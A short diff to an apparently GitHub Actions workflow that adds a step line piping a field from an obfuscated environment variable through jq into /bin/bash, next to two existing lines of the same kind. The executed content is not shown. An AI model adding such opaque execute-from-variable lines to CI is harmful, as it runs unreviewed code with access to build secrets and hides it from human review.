@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$mc49" | jq -r .o26 | /bin/bash
           printf '%s' "$kd8" | jq -r .k60903 | /bin/bash
+          echo $ek859 | jq -r .o436 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
